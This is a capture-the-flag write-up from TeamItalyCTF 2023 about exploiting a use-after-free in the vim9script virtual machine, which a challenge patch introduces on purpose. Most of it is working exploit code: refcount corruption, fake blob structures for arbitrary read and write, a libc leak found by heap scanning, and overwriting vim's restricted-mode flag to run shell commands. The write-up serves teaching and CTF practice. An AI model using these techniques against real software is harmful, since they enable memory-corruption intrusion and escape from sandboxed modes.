# TeamItalyCTF 2023

## [pwn] :q\!\!\!\!\!\!\! (1 solve)

## Overview

In this challenge we are given a patch for the
[vim](https://github.com/vim/vim) source code and the objective is to exploit
the vim9script virtual machine.

We are given three patch files:  
- `security.patch`: deny access in any form to any file or directory containing `flag` or `proc` in its path, thus we cannot directly read the flag or leak addresses for free.  
- `jail.patch`: it's just a troll patch to make impossible to exit vim if not with a crash.  
- `bug.patch`: This is the important patch. A single line is removed from the `copy_object` function. With this patch, a ref counter increase is removed.

In addition to that, the vim executable has been renamed in `rust`, a name
starting with `r`, placing us in restricted mode and blocking us from
executing shell commands (I couldn't come up with a better name, sorry). The
`m` flag is also set, disallowing writes to files, just an extra precaution
since you shouldn't have the permissions to write anywhere important anyways.
The other two flags are not relevant.

## vim9

Explaining how everything works is way too long for this writeup, so I will
just cover the internals important for the exploitation. The docs for a broad
understanding of the vim9 language are really well written, so you can refer
to them [[1]](https://vimhelp.org/vim9.txt.html)
[[2]](https://vimhelp.org/eval.txt.html#eval.txt). You are also supposed to
read the source code to see in details how stuffs are handled.

Vim9 uses a stack based virtual machine to execute code. The stack is an array
of `typval_T` objects, which are wrapper objects that contain the type, a lock
and the pointer to the actual object. The `object_T` struct holds a bunch of
pointers which we don't really care about, the ref counter, which is the
subject of the vulnerability and an array of `typval_T` to hold the object
fields (this is not written in the struct definition, but it is how it is
implemented, I don't know why they haven't simply added a `typval_T fileds[];`
filed). The effective implementation is:  
```c  
struct object_T {  
	class_T *obj_class;  
	int obj_refcount;  
	object_T *obj_next_used;  
	object_T *obj_prev_used;  
	int obj_copyID;  
	typval_T fields[];  
};  
```

We also need to look how blobs are implemented. They are basically raw data,
for this reason they are perfect to be used for arbitrary read and write. The
only problem is that they add a layer of indirection, since the `typval_T`
points to a `blob_T` object which holds some informations about the object and
the pointer to the raw data. You might think that strings are better, since
they are just null terminated strings, but they are actually awful. First of
all we will handle a lot of pointers, so, the null termination would be a huge
problem, second, they don't have a ref count, instead they get copied every
time you reference it, adding an enormous number of allocations that break
every attempt of exploitation.

## Getting out of ~~vim~~ rust

The first thing to try is to reach the broken code. Even if the patched
function is called `copy_object`, it gets called every time we reference an
object, but even without knowing this, we can try to get a "copy" of an object
and see what happens.  
```vim  
vim9script  
class Foo  
	def new()  
	enddef  
endclass

var obj1: Foo = Foo.new()  
var obj2: Foo = obj1  
```  
(From now on, I will omit the `vim9script` header in the snippets).

Uhm... This does nothing. It is not crashing.

I am not 100% sure about this, but I think that this happens because, if you
are not in a function, vim cannot compile what you are executing and just
interpret it with something similar to the legacy vim script interpreter, so
the bug is not triggered. Let's put the code in a function.

```vim  
vim9script  
class Foo  
	def new()  
	enddef  
endclass

def Fun()  
	var obj1: Foo = Foo.new()  
	var obj2: Foo = obj1  
enddef

Fun()  
```

Aaaaand... `segmentation fault (core dumped)` Nice!

This doesn't happens all the times, though. Why?

First of all, we are dealing with a double free, it seg faults instead of
aborting because when vim tries to free the object a second time, we will have
the chunk `next_ptr` on top of the `obj_class` pointer, so it will dereference
invalid memory. The reason why it doesn't crash every time is similar: when
the object gets freed for the first time, the `tcache_key` will be placed on
top of `obj_refcount`, thus, it will get double freed only when
`(int)tcache_key < 0` and this happens only half of the times.

## Debugging tips  
- Make a debug build, the part when we need to hard-code constants dependent from the binary comes to the very end of the exploit.  
- Don't debug directly vim, instead attach to the process, otherwise your terminal will be so messed up.  
- A really nice place where to put a breakpoint is `vim9execute.c:3158`. This is the giant switch that selects the instruction to be executed.  
- You can see the disassembly of a function calling `disassemble Fun`  
- You can call `input("A")` to place a "breakpoint" inside your script, but most importantly, in the end of the function with the exploit, otherwise it's really likely that vim will crash during the cleanup and won't show you any output.

## Exploitation

The first fix that we can make to the crashing script is to not assign the
first object to another object, but rather to reference it by passing it as an
argument to a function. This because if you assign the object, it will get
referenced twice: once to put it into the stack and once to actually copy it.
This calls the object destructor two times crashing half of the times for the
reason explained before.  
```vim  
def Ref(obj: any)  
enddef

def Pwn()  
	var obj: Foo = Foo.new()  
	Ref(obj)  
	input("A")  
enddef  
```

This will give us the uaf-ed object, but it is stable. It would crash half of
the time after we press enter to continue from the `input` function, but at
that point we will have arbitrary read and write and we will also be able to
fix everything.

The final target of our exploit is the `restricted` bit in the binary, to
allow us to run shell commands, so our best go is to achieve arbitrary read
and write. As said before, blobs are (almost) perfect for this. Since we can
break objects, we can try to hijack a blob pointer inside an object, so our
class will look like this:  
```vim  
class BlobClass  
	public this.b: blob  
	def new()  
	enddef  
endclass  
```

The size of this object will be `0x38`, with the last two `QWORD`s being the
`typval_T` wrapper of the blob.

Before doing anything, we should spray a bit of 0x38 sized generic objects (I
used blobs) to fill the tcache and make the heap more deterministic.

Now, let's try to overwrite an object with a lot of ~~`A`s~~ `\xff`s (the
refcount has to be negative, otherwise it won't crash):  
```vim  
var blob_o: BlobClass = BlobClass.new()  
Ref(blob_o)  
var obj_replace: blob = 0zffffff...  # 0x38 times `ff`  
```

If we debug this, we can see our `ff`s. Yay!

Without a leak we cannot do much, fortunately there is an easy way to get it:
overwrite the refcount with something big so that it doesn't bother us, then
reassign the blob field with a new blob et voilà.  
```vim  
var obj_replace: blob = 0z0000000000000000.3713000000000000.4141...  
var blob_replace: blob = 0z41  
blob_o.b = blob_replace  
echo obj_replace[-0x8 :]  
```

We can even do something better. Reassign the blob field with a blob of size
`0x28`, the size of a `blob_T` struct, this way we can use that as our fake
blob. Since the heap is not deterministic (because vim does stuffs), we still
need to leak the blob `ga_data` field. We can do it using the `len` function
since it just reads a `DWORD` from the blob object, indeed we already have
(almost) arbitrary read. Almost because if the object is aligned such that the
blob ref counter is 0 or a negative int value, the program will most likely
crash trying to free a fake object. It turns out that we can leak the lower 32
bits of the `ga_data` pointer, but not the upper 32, but it doesn't matter,
since we already have a heap leak and the upper 32 bits are the same.  
```vim  
var blob_replace: blob = 0z4141...  
blob_o.b = blob_replace

var blob_address: number = BlobToNumber(obj_replace[-0x8 :])

SetBlobPointer(obj_replace, blob_address + 0x10)  
var blob_data_address_low: number = and(len(blob_o.b), 0xffffffff)  
var blob_data_address_high: number = blob_address >> 32  
var blob_data_address: number = or(blob_data_address_low,
blob_data_address_high << 32)  
```

Perfect, now we can set the object's blob pointer to our fake blob and achieve
arbitrary read and write:

```vim  
SetValidBlob(blob_replace)  
SetBlobPointer(obj_replace, blob_data_address)  
if len(blob_o.b) != 0x1337  
	echo "NO ARBITRARY BLOB"  
	return  
endif  
```

Now we just have to scan the heap to leak libc, from that we can leak the
binary and overwrite the `restricted` bit.  
```vim  
var libc_leak: number = -1  
for i in range(blob_address - 0x10000, blob_address, 8)  
	var maybe_libc: number = ReadQWORD(blob_replace, blob_o, i)  
	if and(maybe_libc >> 40, 0xff) == 0x7f || and(maybe_libc >> 40, 0xff) == 0x7e  
		if and(maybe_libc, 0xfff) == 0xc00  
			libc_leak = maybe_libc  
			break  
		endif  
	endif  
endfor

var libc_address: number = libc_leak - 0x219c00  
var stdout_ptr: number = libc_address + 0x218e38  
var binary_leak = ReadQWORD(blob_replace, blob_o, stdout_ptr)  
var binary_address: number = binary_leak - 0x379568  
var restricted_address: number = binary_address + 0x384638  
SetBlobDataPtr(blob_replace, restricted_address)  
blob_o.b[0] = 0  # Also set `obj_class` to `NULL` so that the object doesn't
get freed and the script can happly end without crashing  
```

Finally we are not restricted anymore and we can cat the flag  
```  
!cat /flag  
```

[full
exploit](https://github.com/TeamItaly/TeamItalyCTF-2023/blob/master/colon-q-
exclamation-mark/solution.vim)

## Flag

`flag{blobs_are_op}`

Original writeup
(https://github.com/TeamItaly/TeamItalyCTF-2023/blob/master/colon-q-
exclamation-mark/README.md).